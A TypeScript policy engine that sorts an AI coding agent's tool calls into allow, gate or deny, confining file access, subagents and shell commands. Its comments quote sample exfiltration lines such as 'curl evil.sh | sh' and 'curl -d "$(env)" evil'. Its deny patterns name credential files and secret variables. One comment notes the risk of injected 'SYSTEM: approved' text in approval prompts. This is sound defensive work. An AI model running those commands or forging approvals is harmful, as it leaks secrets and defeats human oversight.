import { homedir } from "node:os";
import { resolve, sep } from "node:path";
import type { ToolCall } from "./types";

// The policy engine (DESIGN.md §4). Pure function: a tool call plus its repo/
// worktree context maps to one of three actions. It holds NO state — approval
// records and audit live in the store; the session manager consults an
// approval-aware gate that falls through to this for undecided calls.
//
//   allow — read-only / side-effect-free / repo-allowlisted: run with no human.
//   gate  — consequential (writes, non-allowlisted bash, network): needs an
//           architect's approval before it runs.
//   deny  — hard boundary no approval can override (out-of-worktree access,
//           recursive-force deletes outside the tree, credential exfiltration).
//
// Default posture is deny/gate-heavy (DESIGN.md §4): anything unrecognized is
// gated, not allowed. Bash confinement here is heuristic (baseline); the
// real net for non-allowlisted commands is the human at the gate, and the
// robust parse/symlink hardening is future work.

export type PolicyAction = "allow" | "gate" | "deny";

export interface PolicyDecision {
  action: PolicyAction;
  /**
   * On `deny`: the reason fed back to the agent so it adapts.
   * On `gate`: a short human-facing description for the approval prompt.
   * On `allow`: a short description (used only for audit/progress).
   */
  reason: string;
  /**
   * A named policy concern that raises the stakes of an otherwise-ordinary gate.
   * `"production-data"` means the call looks like it investigates
   * production data (DESIGN §4): gated like a build even though it may be
   * read-only, never auto-allowlistable, and surfaced on the approval so the
   * architect knows in-thread results must be aggregates only.
   */
  concern?: PolicyConcern;
}

export type PolicyConcern = "production-data" | "workflow-launch";

export interface PolicyContext {
  /** Absolute session worktree; filesystem access is confined to it. */
  worktree: string;
  /** Repo-defined commands that run without approval (exact or prefix match). */
  safeBashAllowlist: string[];
  /**
   * Subagents enabled for this turn. When on, the MAIN agent may
   * auto-spawn subagents (delegation itself is not a gated action — the subagent's
   * own tool calls are gated downstream). Off = a spawn attempt gates (defensive
   * default; the adapter also removes the tools from context). NOTE: the MAIN
   * agent's WORKFLOW launch is always gated (an architect approves
   * each launch), so there is no `workflowsEnabled` gate flag; when workflows are
   * off the adapter removes the Workflow tool from context entirely.
   */
  subagentsEnabled?: boolean;
  /**
   * The informed worktree-write opt-in. When on, subagent/workflow-
   * origin calls and escaped (un-deferrable) calls may WRITE (confined to the
   * worktree via `offendingPath`) without per-write approval. Bash is NOT relaxed
   * (it has no worktree confinement — see evaluateConfined); out-of-worktree,
   * credential, and production-data access stay hard-denied. Off (default) =
   * read-only fan-out: those calls may only run genuine confined reads.
   */
  workflowWrite?: boolean;
}

/**
 * Fed back to a subagent that reached for a gated action. defer→resume can't
 * pause a subagent call (spike 2026-07-18), so subagents are read-only: any gated
 * action must be performed by the main agent, where it can be approved.
 */
const SUBAGENT_GATED_MSG =
  "Subagents can't run gated actions (writing/editing files, shell commands, deploys) or spawn " +
  "further subagents. Report what's needed and let the main agent do it, so an architect can approve.";

/**
 * Fed back when an "escaped" (un-deferrable) call reaches for a gated action.
 * Such a call can't be paused for approval, so it is denied rather than
 * gated; the main agent must do it on its own turn where it can be approved.
 */
const ESCAPED_GATED_MSG =
  "This action can't be paused for approval from here. The main agent must do it on its own turn, " +
  "one call at a time, so an architect can approve it.";

// Multi-agent meta-tools. Spawning is delegation, not a filesystem
// or shell action; when the capability is enabled the spawn auto-allows and the
// subagent's own tool calls are gated (agent_id-tagged) downstream.
const SUBAGENT_SPAWN_TOOLS = new Set(["Agent", "Task"]);
const WORKFLOW_SPAWN_TOOL = "Workflow";

// Tool categories. A tool absent from all of these is unknown → gated.
// `ToolSearch` is side-effect-free: it loads tool SCHEMAS on demand. Allowing
// discovery is safe because every actual tool USE it surfaces still flows through
// this gate, and disallowedTools keeps out-of-scope tools out of context. (Note,
// this does NOT restore Grep/Bash for background WORKFLOW sub-agents — the
// SDK blocks their non-default tool loads UPSTREAM of our gate, spike diag5. It
// only helps the main agent / Agent-subagents, and is the correct classification.)
const NO_FS_TOOLS = new Set(["TodoWrite", "ToolSearch"]);
const READ_TOOLS = new Set(["Read", "Glob", "Grep"]);
const WRITE_TOOLS = new Set(["Write", "Edit", "MultiEdit", "NotebookEdit"]);
const NETWORK_TOOLS = new Set(["WebFetch", "WebSearch"]);
/**
 * The ONLY tools a subagent may run: genuine confined reads plus the
 * side-effect-free planning tool. Note Bash is excluded even when allowlisted —
 * an allowlisted command (e.g. the repo test command) is still code execution, so
 * it is not "read-only" for a subagent and must go to the main agent.
 */
const SUBAGENT_READ_TOOLS = new Set([...NO_FS_TOOLS, ...READ_TOOLS]);

/** Fields across tool inputs that name a filesystem target. */
const PATH_FIELDS = ["file_path", "path", "notebook_path"] as const;

const allow = (reason: string): PolicyDecision => ({ action: "allow", reason });
const gate = (reason: string, concern?: PolicyConcern): PolicyDecision => ({ action: "gate", reason, concern });
const deny = (reason: string): PolicyDecision => ({ action: "deny", reason });

/**
 * The first path field (if any) that resolves outside the worktree. Relative
 * inputs resolve against the worktree because the harness cwd IS the worktree.
 * Returns null when every present path is confined. (Symlink-chasing is future hardening.)
 */
export function offendingPath(worktree: string, input: unknown): string | null {
  if (typeof input !== "object" || input === null) return null;
  const root = resolve(worktree);
  for (const field of PATH_FIELDS) {
    const value = (input as Record<string, unknown>)[field];
    if (typeof value !== "string" || value.length === 0) continue;
    // A leading `~` is never a legitimate in-worktree relative path; expand it
    // as a shell/tool would rather than let node treat it as a literal subdir.
    const expanded = value === "~" || value.startsWith("~/") ? homedir() + value.slice(1) : value;
    const target = resolve(root, expanded);
    if (target !== root && !target.startsWith(root + sep)) return value;
  }
  return null;
}

/**
 * Classify a tool call (DESIGN §4). Dispatches on the call's ORIGIN first: a
 * subagent/workflow-agent call OR an "escaped" un-deferrable call
 * is CONFINED — it can't be paused for approval, so gated actions are
 * denied (read-only), unless the worktree-write opt-in allows confined writes.
 * The main agent may spawn subagents/workflows when enabled; everything else runs
 * the base tool-semantics rules.
 */
export function evaluate(call: ToolCall, ctx: PolicyContext): PolicyDecision {
  const name = call.name;

  // A subagent/workflow-agent call (agentId set — subagent, and workflow
  // agents under bypassPermissions) or an escaped call that reached the harness's
  // un-deferrable backstop. Both are confined: they can't defer, so a would-
  // be gate becomes a deny (read-only), unless the architect opened worktree writes.
  if (call.agentId || call.escaped) return evaluateConfined(call, ctx);

  // Main agent spawning a subagent / workflow. Delegation is not itself a gated
  // action when the architect enabled the capability; the disallowedTools set
  // already removes these from context when it's off, so the gate branch is a
  // deny-heavy backstop.
  if (SUBAGENT_SPAWN_TOOLS.has(name)) {
    return ctx.subagentsEnabled ? allow("delegate to a subagent") : gate("delegate to a subagent");
  }
  if (name === WORKFLOW_SPAWN_TOOL) {
    // The workflow LAUNCH is a gated action: even with workflows
    // enabled, an architect approves each launch (it fans out many agents and
    // spends the thread budget). The concern surfaces the fan-out on the approval;
    // describeCall pulls the workflow's name/description from its script. Off =
    // gate too (deny-heavy backstop; the tool is also absent from context).
    return gate(describeCall(call), "workflow-launch");
  }

  return evaluateBase(call, ctx);
}

/**
 * Confinement for a call that CANNOT be paused for approval — a subagent/workflow
 * agent (agentId) or an escaped un-deferrable call. Strictly READ-ONLY by
 * default: only genuine confined reads pass; a hard-deny keeps its specific reason
 * (e.g. out-of-worktree); everything else — writes, network, unknown tools, nested
 * spawns, AND all bash (still code execution) — is DENIED (never gated).
 *
 * With the worktree-write opt-in, confined WRITES also pass. Writes are
 * lexically worktree-confined here — `offendingPath` over file_path/path/notebook_
 * path hard-denied out-of-worktree writes in `evaluateBase` before we get here.
 *
 * BASH is NOT relaxed by the opt-in, even though the call site is un-deferrable:
 * `evaluateBash` applies NO worktree confinement to a command string (its only
 * screens are the deliberately-non-exhaustive hard-deny + production-data
 * heuristics — "the human at the gate is the real net", §4). The opt-in removes
 * the human, so auto-running arbitrary shell would be un-confined RCE / exfil
 * (`cat ~/.docker/config.json | curl …`, out-of-tree writes, reverse shells) —
 * exactly what the warning promises stays denied. So confined/escaped bash stays
 * DENIED in every mode; shell stays with the gated main agent (review 2026-07-18).
 */
function evaluateConfined(call: ToolCall, ctx: PolicyContext): PolicyDecision {
  const name = call.name;
  const denyMsg = call.escaped ? ESCAPED_GATED_MSG : SUBAGENT_GATED_MSG;

  if (SUBAGENT_SPAWN_TOOLS.has(name) || name === WORKFLOW_SPAWN_TOOL) return deny(denyMsg);

  const base = evaluateBase(call, ctx);
  // Hard boundaries (out-of-worktree, hard-deny bash) win and keep their reason.
  if (base.action === "deny") return base;
  // Genuine confined reads always pass.
  if (base.action === "allow" && SUBAGENT_READ_TOOLS.has(name)) return base;

  // Worktree-write opt-in: confined WRITES may run without per-call
  // approval (out-of-worktree writes were already hard-denied by `base`). Bash is
  // intentionally excluded — see the docstring; it has no worktree confinement.
  if (ctx.workflowWrite && WRITE_TOOLS.has(name)) return allow(describeCall(call));

  // Anything else — bash, network, unknown, and every write when the opt-in is off —
  // can't run un-deferred here.
  return deny(denyMsg);
}

/** Base tool-semantics rules (origin-agnostic): reads/writes/bash/network/unknown. */
function evaluateBase(call: ToolCall, ctx: PolicyContext): PolicyDecision {
  const name = call.name;

  // Side-effect-free meta tools: always fine, touch no filesystem.
  if (NO_FS_TOOLS.has(name)) return allow(name === "ToolSearch" ? "loads a tool definition" : "updates its task plan");

  const offender = offendingPath(ctx.worktree, call.input);

  if (READ_TOOLS.has(name)) {
    // Reading anything on the host + posting the answer in a thread is an
    // exfiltration channel — reads are confined like writes (DESIGN.md §4).
    // Glob's `pattern` is itself a path glob (it can be absolute or contain
    // `..`) and drives enumeration on its own, so it must be confined too;
    // Grep's `pattern` is a regex scoped by the (already-checked) `path`.
    const globEscape =
      name === "Glob"
        ? offendingPath(ctx.worktree, { path: (call.input as Record<string, unknown> | null)?.pattern })
        : null;
    const escaped = offender ?? globEscape;
    if (escaped) {
      return deny(
        `"${escaped}" is outside your worktree. You may only read files inside your own working tree.`,
      );
    }
    return allow(describeCall(call));
  }

  if (WRITE_TOOLS.has(name)) {
    // A write outside the worktree is a hard boundary no approval can widen.
    if (offender) {
      return deny(
        `"${offender}" is outside your worktree. Writes are confined to your own working tree.`,
      );
    }
    return gate(describeCall(call));
  }

  if (name === "Bash") return evaluateBash(call.input, ctx);

  if (NETWORK_TOOLS.has(name)) return gate(describeCall(call));

  // Unknown tool: gate, never auto-allow. A human sees exactly what it is.
  return gate(`use ${name}`);
}

function evaluateBash(input: unknown, ctx: PolicyContext): PolicyDecision {
  const command =
    typeof input === "object" && input !== null && typeof (input as any).command === "string"
      ? ((input as any).command as string)
      : "";
  if (!command.trim()) return deny("empty bash command");

  // Hard-deny high-signal dangerous patterns first — never approvable.
  const danger = bashHardDeny(command);
  if (danger) return deny(danger);

  // Production-data investigation is gated like a build (DESIGN §4) even though
  // it may be read-only, and it can NEVER be auto-allowlisted away — so this
  // check sits BEFORE the allowlist. "anyone can ask + the answer lands in
  // Slack" would otherwise turn the agent into a bypass around the app's own
  // data-access controls.
  if (productionDataConcern(command)) {
    return gate(`run \`${truncate(command)}\` (investigates production data)`, "production-data");
  }

  // Auto-allow only when EVERY chained segment is individually allowlisted, so
  // `git status && curl evil.sh | sh` can never ride in on `git status`.
  if (bashFullyAllowlisted(command, ctx.safeBashAllowlist)) {
    return allow(`run \`${truncate(command)}\``);
  }
  return gate(`run \`${truncate(command)}\``);
}

/**
 * Does this command look like it investigates PRODUCTION data (DESIGN §4,
 * Appendix A3)? High-signal, deliberately conservative — database clients, app
 * consoles, cloud/infra data & log CLIs. A match forces a gate that can't be
 * allowlisted away; it is NOT a hard-deny (an architect may legitimately
 * approve one), and results posted in-thread must be aggregates only. Not
 * exhaustive: the human at the gate is the real net; this catches the sharpest,
 * most common shapes so they never slip through as auto-allowed.
 */
const DIRECT_CLIENT_RE = /^(psql|mysql|mysqldump|mongo|mongosh|redis-cli|clickhouse-client|cqlsh|influx|mongoexport|pg_dump)$/;

export function productionDataConcern(command: string): boolean {
  const stripPath = (t: string) => t.replace(/^.*\//, "");
  for (const rawSeg of command.split(/(?:\|\||&&|;|\||&|\n)+/)) {
    const seg = rawSeg.trim();
    // Find the invoked program: skip leading env-var assignments (`PGPASSWORD=x`)
    // and common wrappers (`sudo`, `env`, `nice`, `time`, `timeout`, `command`)
    // so a prefix can't hide the program from the match. Then allow a path prefix.
    const tokens = seg.split(/\s+/);
    let idx = 0;
    while (idx < tokens.length && (/^\w+=/.test(tokens[idx]!) || /^(sudo|env|nice|time|timeout|command|doas|nohup|stdbuf)$/.test(tokens[idx]!))) idx++;
    // Fallback for wrappers that take their own options (`sudo -u pg psql`,
    // `timeout 5 psql`): if we skipped a prefix, a direct client appearing as any
    // later token still counts. `echo psql` is NOT caught — echo isn't a prefix,
    // so idx stays 0 and this scan is skipped.
    if (idx > 0 && tokens.slice(idx).some((t) => DIRECT_CLIENT_RE.test(stripPath(t)))) return true;
    const first = tokens[idx] ?? "";
    const prog = stripPath(first);
    const rest = " " + tokens.slice(idx + 1).join(" ");
    // Direct database / cache / search clients.
    if (DIRECT_CLIENT_RE.test(prog)) return true;
    // App consoles / runners that reach the live datastore.
    if (/^(rails)$/.test(prog) && /\b(c|console|dbconsole|runner)\b/.test(rest)) return true;
    if (/^(rails)$/.test(prog) && rest.trim() === "") return true;
    if (/^(django-admin)$/.test(prog) && /\b(shell|dbshell|shell_plus)\b/.test(rest)) return true;
    // manage.py may be run via an interpreter (`python manage.py shell`), so
    // match it anywhere in the segment rather than only as the first token.
    if (/(?:^|[\s\/])manage\.py\s+(shell|dbshell|shell_plus)\b/.test(seg)) return true;
    if (/^(heroku|flyctl|fly|doctl|kubectl|wrangler)$/.test(prog) && /\b(run|console|logs|exec|db|psql|proxy)\b/.test(rest)) return true;
    // Cloud data & log services (read of prod data / logs).
    if (/^aws$/.test(prog) && /\b(s3|rds|dynamodb|logs|athena|redshift|secretsmanager|ssm)\b/.test(rest)) return true;
    if (/^(gcloud|bq|gsutil)$/.test(prog) && /\b(sql|logging|logs|bigquery|storage|secrets)\b/.test(rest)) return true;
    if (/^az$/.test(prog) && /\b(sql|cosmosdb|storage|monitor|keyvault)\b/.test(rest)) return true;
  }
  return false;
}

/**
 * A small, deliberately conservative denylist of things no architect should be
 * able to approve by a mis-click. NOT exhaustive — the gate (human approval) is
 * the real net for everything non-allowlisted; this only catches the sharpest
 * edges. Hardening (full shell parsing, more patterns) is future work.
 */
export function bashHardDeny(command: string): string | null {
  // Recursive force-delete whose target escapes the worktree (absolute, home,
  // parent, variable-expanded, or wildcard). A relative `rm -rf build` is left
  // to the gate; an `rm -rf /` or `rm -rf ~` is refused outright. Quotes are
  // stripped first so `rm -rf "/"` / `rm -rf "$HOME"` can't hide the target.
  for (const rawSeg of command.split(/(?:\|\||&&|;|\||&|\n)+/)) {
    const seg = rawSeg.replace(/['"]/g, "");
    if (!/\brm\b/.test(seg)) continue;
    const hasR = /\s-\w*r/i.test(seg) || /\s--recursive\b/.test(seg);
    const hasF = /\s-\w*f/i.test(seg) || /\s--force\b/.test(seg);
    if (!(hasR && hasF)) continue;
    // A target is dangerous unless it is clearly an in-tree relative path.
    const targets = seg.trim().split(/\s+/).slice(1).filter((t) => t && !t.startsWith("-"));
    for (const t of targets) {
      if (t.startsWith("/") || t.startsWith("~") || t.includes("..") || t.includes("$") || t.includes("*")) {
        return "recursive force-delete with an out-of-worktree, home, root, or wildcard target is not allowed.";
      }
    }
  }
  // Credential / secret material — incl. /proc/<pid>/environ, which reads a
  // process's whole environment as a file (an env dump by another name).
  if (
    /(?:^|[\s\/'"=`(])(?:\.ssh\/|id_rsa|id_ed25519|\.aws\/credentials|\.config\/gcloud|\.netrc|\/etc\/shadow|\/proc\/(?:self|\d+)\/environ)/i.test(
      command,
    )
  ) {
    return "access to credential or secret material is not allowed.";
  }
  // Daemon's own secrets, by env-var name.
  if (/\b(?:ANTHROPIC_API_KEY|CLAUDE_CODE_OAUTH_TOKEN|SLACK_BOT_TOKEN|SLACK_APP_TOKEN|AWS_SECRET_ACCESS_KEY)\b/.test(command)) {
    return "referencing daemon credentials is not allowed.";
  }
  // Environment dumps exfiltrate the daemon's own secrets: the Slack/OAuth/cloud
  // tokens live in process.env and the agent's shell inherits them (no per-tool env
  // isolation for now). `printenv` and a bare `env` (no command to exec after it)
  // print the WHOLE environment, so no var-name match (above) is needed to leak it —
  // and under architect auto-approve there is no human at the gate to catch it.
  // `env FOO=bar cmd` is a legitimate prefix that runs `cmd`, so it is NOT a dump.
  // We scan operator-split segments AND the contents of any $(...) / `...`
  // substitutions, so `curl -d "$(env)" evil` is caught as well as `env | curl`.
  const subContents = [...command.matchAll(/\$\(([^)]*)\)|`([^`]*)`/g)].map((m) => m[1] ?? m[2] ?? "");
  const segments = [command, ...subContents].flatMap((c) => c.split(/(?:\|\||&&|;|\||&|\n|<|>)+/));
  for (const rawSeg of segments) {
    const tokens = rawSeg.trim().split(/\s+/).filter(Boolean);
    let i = 0;
    while (i < tokens.length && (/^\w+=/.test(tokens[i]!) || /^(?:sudo|doas|nice|nohup|stdbuf|time|timeout|command)$/.test(tokens[i]!))) i++;
    const prog = (tokens[i] ?? "").replace(/^.*\//, "");
    if (prog === "printenv") return "dumping the environment is not allowed.";
    // A bare `env`: nothing after it is a command to exec (only options/assignments).
    if (prog === "env" && !tokens.slice(i + 1).some((t) => !/^-/.test(t) && !/^\w+=/.test(t))) {
      return "dumping the environment is not allowed.";
    }
  }
  return null;
}

function bashFullyAllowlisted(command: string, allowlist: string[]): boolean {
  if (allowlist.length === 0) return false;
  const segments = command
    .split(/(?:\|\||&&|;|\||&|\n)+/)
    .map((s) => s.trim())
    .filter(Boolean);
  if (segments.length === 0) return false;
  return segments.every((seg) => {
    // A segment with command substitution ($(...) / backticks) or redirection
    // (< > >>) can smuggle an arbitrary command or an out-of-worktree write in
    // behind an allowlisted prefix — never auto-allow it; send it to the gate.
    if (/[$`()<>]/.test(seg)) return false;
    const norm = seg.replace(/\s+/g, " ");
    return allowlist.some((entry) => {
      const e = entry.trim().replace(/\s+/g, " ");
      return e.length > 0 && (norm === e || norm.startsWith(e + " "));
    });
  });
}

function truncate(s: string, max = 120): string {
  const oneLine = s.replace(/\s+/g, " ").trim();
  return oneLine.length > max ? oneLine.slice(0, max - 1) + "…" : oneLine;
}

/**
 * Best-effort pull of `name`/`description` from a Workflow tool call's `script`
 * (a JS string beginning with `export const meta = { name: '…', description: '…' }`).
 * Used only to DESCRIBE a launch for the approval/progress — the script is never
 * executed here. Returns null if absent or the fields can't be found. Scans only
 * the meta block so a later string literal can't be mistaken for it.
 */
export function parseWorkflowMeta(script: unknown): { name?: string; description?: string } | null {
  if (typeof script !== "string" || script.length === 0) return null;
  const metaStart = script.indexOf("meta");
  const scope = metaStart >= 0 ? script.slice(metaStart, metaStart + 1200) : script.slice(0, 1200);
  const grab = (key: string): string | undefined => {
    const m = scope.match(new RegExp(`${key}\\s*:\\s*(['"\`])([^'"\`]{0,200})\\1`));
    if (!m?.[2]) return undefined;
    // The script is authored by the main agent (injection-reachable), and this text
    // lands in the human launch-approval prompt (§4 / Appendix A1). Sanitize it to a
    // single short line: collapse ALL whitespace incl. newlines (so it can't forge a
    // multi-line "SYSTEM: approved" block), strip control chars, cap the length.
    const clean = m[2].replace(/[\x00-\x1f\x7f]+/g, " ").replace(/\s+/g, " ").trim();
    return clean.length > 100 ? clean.slice(0, 99) + "…" : clean || undefined;
  };
  const name = grab("name");
  const description = grab("description");
  return name || description ? { name, description } : null;
}

/** Short human-readable description of a tool call, for prompts and audit. */
export function describeCall(call: ToolCall): string {
  const i = (call.input ?? {}) as Record<string, unknown>;
  switch (call.name) {
    case "Workflow": {
      const meta = parseWorkflowMeta(i.script ?? i.scriptPath);
      if (meta?.name && meta.description) return `run the workflow \`${meta.name}\` — ${meta.description}`;
      if (meta?.name) return `run the workflow \`${meta.name}\``;
      return "run a multi-agent workflow";
    }
    case "Agent":
    case "Task":
      return "delegate to a subagent";
    case "Read":
      return `read ${i.file_path ?? "a file"}`;
    case "Glob":
      return `list files matching ${i.pattern ?? "a pattern"}`;
    case "Grep":
      return `search for ${i.pattern ?? "a pattern"}`;
    case "Write":
      return `write ${i.file_path ?? "a file"}`;
    case "Edit":
    case "MultiEdit":
      return `edit ${i.file_path ?? "a file"}`;
    case "NotebookEdit":
      return `edit notebook ${i.notebook_path ?? ""}`.trim();
    case "Bash":
      return `run \`${truncate(String(i.command ?? ""))}\``;
    case "WebFetch":
      return `fetch ${i.url ?? "a URL"}`;
    case "WebSearch":
      return `search the web for ${i.query ?? "a query"}`;
    default:
      return `use ${call.name}`;
  }
}
